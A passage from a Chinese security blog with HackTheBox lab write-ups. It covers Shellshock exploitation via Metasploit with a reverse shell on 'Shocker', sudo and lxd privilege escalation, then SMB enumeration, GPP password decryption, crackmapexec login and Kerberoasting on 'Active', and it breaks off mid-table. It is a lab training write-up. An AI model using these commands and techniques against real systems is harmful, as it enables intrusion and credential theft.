<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set rhosts 10.10.10.56</span><br><span class="line">rhosts =&gt; 10.10.10.56</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set targeturi /cgi-bin/user.sh</span><br><span class="line">targeturi =&gt; /cgi-bin/user.sh</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4444</span><br><span class="line">[*] Command Stager progress - 100.46% done (1097/1092 bytes)</span><br><span class="line">[*] Sending stage (980808 bytes) to 10.10.10.56</span><br></pre></td></tr></table></figure>

<h1 id="priv-esc"><a href="#priv-esc" class="headerlink" title="priv esc"></a>priv esc</h1><h2 id="sudo-perl"><a href="#sudo-perl" class="headerlink" title="sudo perl"></a>sudo perl</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for shelly on Shocker:</span><br><span class="line">env<span class="emphasis">_reset, mail_</span>badpass,</span><br><span class="line">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User shelly may run the following commands on Shocker:</span><br><span class="line">(root) NOPASSWD: /usr/bin/perl</span><br></pre></td></tr></table></figure>

<h2 id="priv-esc-via-lxd"><a href="#priv-esc-via-lxd" class="headerlink" title="priv esc via lxd"></a>priv esc via lxd</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\$ cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">\$ id</span><br><span class="line">uid=1000(shelly) ... 110(lxd) ...</span><br></pre></td></tr></table></figure>

<h1 id="Note-on-ShellShock"><a href="#Note-on-ShellShock" class="headerlink" title="Note on ShellShock"></a>Note on ShellShock</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594266649245-d88435b8-f042-4550-86fa-f91203014705.jpeg#align=left&display=inline&height=511&margin=%5Bobject%20Object%5D&originHeight=511&originWidth=395&size=0&status=done&style=none&width=395" alt=""></p>
<blockquote>
<p>GNU Bash 4.3 及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行 Shell 命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用 Bash Shell 之前可以用构造的值创建环境变量。这些变量可以包含代码，在 Shell 被调用后会被立即执行。<br>以下几点值得特别注意：</p>
<ul>
<li>这个漏洞的英文是：ShellShock，中文名被 XCERT 命名为：破壳漏洞。</li>
<li>来自 CVSS 的评分：破壳漏洞的严重性被定义为 10 级（最高），今年 4 月爆发的 OpenSSL“心脏出血”漏洞才 5 级！</li>
<li>破壳漏洞存在有 25 年，和 Bash 年龄一样。</li>
</ul>
<p>GNU Bash &lt;= 4.3，此漏洞可能会影响到</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594266142774-e2a59a54-e481-4409-a882-d215069aceb9.png#align=left&display=inline&height=89&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=89&originWidth=811&size=10652&status=done&style=none&width=811" alt="图片.png"></p>
<ol>
<li>对于 HTTP 头部，CGI 脚本解析器会将其当作环境变量，调用 bash 的 env 相关函数设置到临时环境变量中；</li>
<li>HTTP 协议允许发送任意客户端自定义的 HTTP 头部；</li>
<li>这样就产生了一个完整的可供 Bash 命令注入的场景，客户端故意发送构造好的带攻击命令的 HTTP 头部到服务端，服务端调用设置环境变量的函数，直接执行了客户端指定的头部里面的命令。并且还会将结果一并返回给客户端。</li>
</ol>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Shellshock 的原理是利用了 Bash 在导入环境变量函数时候的漏洞，启动 Bash 的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。在有些 CGI 脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用 Shellshock 漏洞的机会。<br>目前的 bash 使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“<code>(){</code>”开头定义的环境变量在命令 ENV 中解析成函数后，Bash 执行并未退出，而是继续解析并执行 shell 命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。<br>Apache 服务器中使用<code>mod_cgi</code>（不包括<code>mod_php</code>或<code>mod_python</code>）运行脚本的时候，数据是通过环境变量来传递的，这可以算是互联网领域最古老的一些技术了。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>可以使用如下命令来检查系统是否存在此漏洞（在本机 Bash 环境下运行）：<br><strong>破壳 1，CVE-2014-6271</strong>，测试方法：<br><code>env x=&#39;() { :;}; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>如执行结果如下表明有漏洞：<code>vulnerable, this is a test</code></p>
<hr>
<p><strong>破壳 2，CVE-2014-7169，</strong>测试方法：<br><code>env -i X=&#39;() { (a)=&gt;\&#39; bash -c &#39;echo date&#39;; cat echo</code><br>如执行结果如下则仍然存在漏洞：<br><code>bash: X: line 1: syntax error near unexpected token =&#39;bash: X: line 1: &#39;bash: error importing function definition for</code>X’Wed Sep 24 14:12:49 PDT 2014`<br>…</p>
<h2 id="Fuzzing-列表"><a href="#Fuzzing-列表" class="headerlink" title="Fuzzing 列表"></a>Fuzzing 列表</h2><p>经过 ZoomEye 的 Fuzzing 探测，Fuzzing 列表如下：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/load.cgi</span><br><span class="line">/cgi-bin/gsweb.cgi</span><br><span class="line">/cgi-bin/redirector.cgi</span><br><span class="line">/cgi-bin/test.cgi</span><br><span class="line">/cgi-bin/index.cgi</span><br><span class="line">/cgi-bin/help.cgi</span><br><span class="line">/cgi-bin/about.cgi</span><br><span class="line">/cgi-bin/vidredirect.cgi</span><br><span class="line">/cgi-bin/click.cgi</span><br><span class="line">/cgi-bin/details.cgi</span><br><span class="line">/cgi-bin/log.cgi</span><br><span class="line">/cgi-bin/viewcontent.cgi</span><br><span class="line">/cgi-bin/content.cgi</span><br><span class="line">/cgi-bin/admin.cgi</span><br><span class="line">/cgi-bin/webmail.cgi</span><br></pre></td></tr></table></figure>

<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>现在可以按照下面方式进行 Bash 的升级修复：</p>
<table>
<thead>
<tr>
<th>操作系统</th>
<th>升级方式</th>
</tr>
</thead>
<tbody><tr>
<td>Ubuntu/Debian</td>
<td>apt-get update</td>
</tr>
<tr>
<td>apt-get install bash</td>
<td></td>
</tr>
<tr>
<td>RedHat/CentOS/Fedora</td>
<td>yum update -y bash</td>
</tr>
<tr>
<td>Arch Linux</td>
<td>pacman -Syu</td>
</tr>
<tr>
<td>OS X</td>
<td>brew update</td>
</tr>
</tbody></table>
<p>brew install bash<br>sudo sh -c ‘echo “/usr/local/bin/bash” &gt;&gt; /etc/shells’<br>chsh -s /usr/local/bin/bash<br>sudo mv /bin/bash /bin/bash-backup<br>sudo ln -s /usr/local/bin/bash /bin/bash |<br>| MacPorts | sudo port self update<br>sudo port upgrade bash |</p>
<p>建议升级后按上面的方法诊断是否补丁完全。</p>
<h2 id="感慨"><a href="#感慨" class="headerlink" title="感慨"></a>感慨</h2><p>威胁经常在人们不期望它们到来的时候到来，也许是无心的雪崩，也许是有意的蓄谋。“病毒不会在星期天休息”这是安天新员工培训时必须传递的一句话，我们从柏松那里听到过这句话，我们也把这句话讲给过安天的新人。我们也许会在一瞬间被威胁打的措手不及，但不会有威胁能长久的逃逸出我们的感知和分析。<br>谨把我们的工作献给我们家人、我们的战友和我们的祖国</p>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
<li><a href="https://www.anquanke.com/post/id/179407" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179407</a></li>
<li><a href="https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd" target="_blank" rel="noopener">https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd</a></li>
<li><a href="https://www.jianshu.com/p/66f74282a299" target="_blank" rel="noopener">Shocker</a></li>
<li><a href="https://github.com/nccgroup/shocker" target="_blank" rel="noopener"> nccgroup / shocker </a></li>
<li><a href="https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/" target="_blank" rel="noopener">https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/</a></li>
<li><a href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/" target="_blank" rel="noopener">https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/</a></li>
<li><a href="https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt</a></li>
<li><a href="https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html" target="_blank" rel="noopener">https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html</a></li>
<li><a href="https://blog.csdn.net/weixin_33709219/article/details/87981615" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33709219/article/details/87981615</a></li>
<li><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></li>
<li><a href="https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html" target="_blank" rel="noopener">https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/06/27/yuque/HackTheBox%EF%BC%9AActive%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/06/27/yuque/HackTheBox%EF%BC%9AActive%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Active笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-27T23:09:32+08:00">
                2020-06-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593282512907-313f899a-aeaf-4fd0-ba16-87cc06dacf44.png#align=left&display=inline&height=303&margin=%5Bobject%20Object%5D&name=Deepin%20%E6%88%AA%E5%9C%96_select-area_20200628022810.png&originHeight=606&originWidth=1041&size=179864&status=done&style=none&width=521" alt="Deepin 截圖_select-area_20200628022810.png"><br>10.10.10.100</p>
<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	nmap -p- -sC -sV -oA allport.nmap 10.10.10.100</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">Host is up (<span class="number">0.0036</span>s latency).</span><br><span class="line">Not shown: <span class="number">65512</span> closed ports</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp    open  domain        Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39) (Windows Server <span class="number">2008</span> R2 SP1)</span><br><span class="line">| dns<span class="literal">-nsid</span>:</span><br><span class="line">|_  bind.version: Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39)</span><br><span class="line"><span class="number">88</span>/tcp    open  kerberos<span class="literal">-sec</span>  Microsoft Windows Kerberos (server time: <span class="number">2020</span><span class="literal">-06</span><span class="literal">-27</span> <span class="number">14</span>:<span class="number">12</span>:<span class="number">30</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios<span class="literal">-ssn</span>   Microsoft Windows netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default<span class="literal">-First</span><span class="literal">-Site</span><span class="literal">-Name</span>)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft<span class="literal">-ds</span>?</span><br><span class="line"><span class="number">464</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default<span class="literal">-First</span><span class="literal">-Site</span><span class="literal">-Name</span>)</span><br><span class="line"><span class="number">3269</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">5722</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">9389</span>/tcp  open  mc<span class="literal">-nmf</span>        .NET Message Framing</span><br><span class="line"><span class="number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Microsoft<span class="literal">-HTTPAPI</span>/<span class="number">2.0</span></span><br><span class="line">|_http<span class="literal">-title</span>: Not Found</span><br><span class="line"><span class="number">49152</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49153</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49155</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49157</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">49158</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49169</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49171</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49180</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_c<span class="built_in">lock-skew</span>: <span class="number">2</span>m57s</span><br><span class="line">| smb2<span class="literal">-security</span><span class="literal">-mode</span>:</span><br><span class="line">|   <span class="number">2.02</span>:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2<span class="literal">-time</span>:</span><br><span class="line">|   date: <span class="number">2020</span><span class="literal">-06</span><span class="literal">-27T14</span>:<span class="number">13</span>:<span class="number">29</span></span><br><span class="line">|_  start_date: <span class="number">2020</span><span class="literal">-06</span><span class="literal">-27T12</span>:<span class="number">57</span>:<span class="number">05</span></span><br></pre></td></tr></table></figure>

<p>用<code>enum4linux</code>工具扫描，发现 smb 服务是开着的，且有开放的共享目录</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># enum4linux -a 10.10.10.100</span></span><br><span class="line"></span><br><span class="line">=========================================</span><br><span class="line">| Share Enumeration on 10.10.10.100 |</span><br><span class="line">=========================================</span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.</span><br><span class="line"></span><br><span class="line"><span class="code">    Sharename       Type      Comment</span></span><br><span class="line"><span class="code">    ---------       ----      -------</span></span><br><span class="line"><span class="code">    ADMIN$          Disk      Remote Admin</span></span><br><span class="line"><span class="code">    C$              Disk      Default share</span></span><br><span class="line"><span class="code">    IPC$            IPC       Remote IPC</span></span><br><span class="line"><span class="code">    NETLOGON        Disk      Logon server share</span></span><br><span class="line"><span class="code">    Replication     Disk</span></span><br><span class="line"><span class="code">    SYSVOL          Disk      Logon server share</span></span><br><span class="line"><span class="code">    Users           Disk</span></span><br><span class="line"></span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">...</span><br><span class="line">[+] Attempting to map shares on 10.10.10.100</span><br><span class="line">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/ADMIN$ Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/C$ Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/IPC$ Mapping: OK Listing: DENIED</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/NETLOGON Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/Replication Mapping: OK, Listing: OK</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/SYSVOL Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/Users Mapping: DENIED, Listing: N/A</span><br></pre></td></tr></table></figure>

<p>看看里面都有些啥文件</p>
<h1 id="smb-gt-group-xml"><a href="#smb-gt-group-xml" class="headerlink" title="smb -&gt; group.xml"></a>smb -&gt; group.xml</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbmap -H 10.10.10.100</span></span><br><span class="line"></span><br><span class="line">[+] IP: 10.10.10.100:445 Name: 10.10.10.100  </span><br><span class="line"> Disk Permissions Comment</span><br><span class="line">---- ----------- -------</span><br><span class="line">ADMIN$             	NO ACCESS	Remote Admin</span><br><span class="line"><span class="code">	C$ NO ACCESS Default share</span></span><br><span class="line">IPC\$ NO ACCESS Remote IPC</span><br><span class="line">NETLOGON NO ACCESS Logon server share</span><br><span class="line">Replication READ ONLY</span><br><span class="line">SYSVOL NO ACCESS Logon server share</span><br><span class="line">Users NO ACCESS</span><br></pre></td></tr></table></figure>

<p>空密码登录上去，成了。（此处也可用这种方式来空密码      登录<code>smbclient //10.10.10.100/Replication -U %</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbclient -H //10.10.10.100/Replication -R -U ''</span></span><br><span class="line"></span><br><span class="line">handle<span class="emphasis">_name_</span>resolve_order: WARNING: Ignoring invalid list value '-U' for parameter 'name resolve order'</span><br><span class="line">Anonymous login successful</span><br><span class="line">Try "help" to get a list of possible commands.</span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></table></figure>

<p>发现了个名为<code>cpassword</code>的敏感信息<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593275741345-89a571a5-0b88-429d-959a-04f87555181f.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&name=group_xml.png&originHeight=172&originWidth=1912&size=76971&status=done&style=none&width=746" alt="group_xml.png"></p>
<h1 id="密码破解-gpp"><a href="#密码破解-gpp" class="headerlink" title="密码破解:gpp"></a>密码破解:gpp</h1><p>一番搜索得知，这个密码就是 windows 的密码，不过是用 AES 加了密的，可是微软官方<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2" target="_blank" rel="noopener">在这里</a>提供了解密的密钥，导致可以获取原密码。理论支撑<a href="https://blog.compass-security.com/2012/04/exploit-credentials-stored-in-windows-group-policy-preferences/" target="_blank" rel="noopener">在这里</a>。<br>此处我们采用脚本<a href="https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py" target="_blank" rel="noopener">gpprefdecrypt.py</a>进行解密（当然用 kali 自带的<code>gpp-decrypt</code>也行</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># python Gpprefdecrypt.py 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span></span><br><span class="line"></span><br><span class="line"><span class="code">    GPPstillStandingStrong2k18</span></span><br></pre></td></tr></table></figure>

<p>至此，我们已经获得一组用户的帐号密码<code>SVC_TGS : GPPstillStandingStrong2k18</code>，域名称是<code>active.htb</code><br>由于靶机的 5985/5986 端口未开放，不能用 evil-rm 来验证。可以用 msf 里的<code>smb_login</code>模块，来验证这个凭据是否有效。<br>不过这里，我采用 smbclient 来登录到共享文件夹，从而获取<code>user.txt</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18</span></span><br></pre></td></tr></table></figure>

<p>此外，还有一个 cme[<code>crackmapexec</code>]，作为 windows 域渗透时常用到的工具，也可以登录并执行命令（执行命令需 system 权限），如图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593357285845-a8a530b3-f6b1-4708-9d0a-9dbf5c1984c6.png#align=left&display=inline&height=587&margin=%5Bobject%20Object%5D&name=cme.png&originHeight=587&originWidth=1917&size=379101&status=done&style=none&width=1917" alt="cme.png"><br>登录</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18</span></span><br><span class="line"></span><br><span class="line">SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure>

<p>问题来了，怎么拿到 user 的 shell 呢<br>尝试使用 msf 的 windows/smb/psexec 模块，结果失败，原因是模块必须要管理员权限（下文有写到）</p>
<blockquote>
<p>This module uses a <strong>valid administrator username</strong> and password (or<br> password hash) to execute an arbitrary payload.</p>
</blockquote>
<p>一番操作无果，无奈寻找其它方式</p>
<h1 id="提权-Kerberoasting"><a href="#提权-Kerberoasting" class="headerlink" title="提权:Kerberoasting"></a>提权:Kerberoasting</h1><p>关于<code>Kerberoasting</code>的详细说明，三好学生师傅<a href="https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/" target="_blank" rel="noopener">在这里</a>已经说得很好了。简单来说，这种方式主要有如下几个要点：</p>
<ol>
<li>域内的主机都能查询 SPN。因此利用时可以考虑以下两种关系<ul>
<li>该 SPN 注册在域用户帐户(Users)下 =&gt; administrator 是默认的用户</li>
<li>域用户账户的权限很高     =&gt; administrator 权限当然很高</li>
</ul>
</li>
<li>域内的任何用户都可以向域内的任何服务请求 TGS    =&gt;    此处由<code>SVC_TGS</code>到<code>administrator</code></li>
<li>在 kerberos 认证过程的第 4 步中，用户将会收到由目标服务实例的 NTLM hash 加密生成的 TGS(service ticket)，加密算法为<code>RC4-HMAC</code>，有现成的爆破工具(hashcat)。有兴趣了解这种算法的师傅可以在<a href="https://tools.ietf.org/html/rfc4757" target="_blank" rel="noopener">rfc4757:RC4-HMAC</a>中找到更多信息。</li>
<li>当获得这个 TGS 后，我们可以使用密码字典，模拟加密过程，一次次生成 TGS 进行比较，来尝试穷举口令。</li>
</ol>
<p>同时，根据 att&amp;ck 框架的描述，这种攻击手法可以用以下几种方式来完成</p>
<blockquote>
<p>Kerberoasting, Technique T1208 - Enterprise | MITRE ATT&amp;CK®<br><a href="https://attack.mitre.org/techniques/T1208/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1208/</a></p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://attack.mitre.org/software/S0363" target="_blank" rel="noopener"> Empire </a></td>
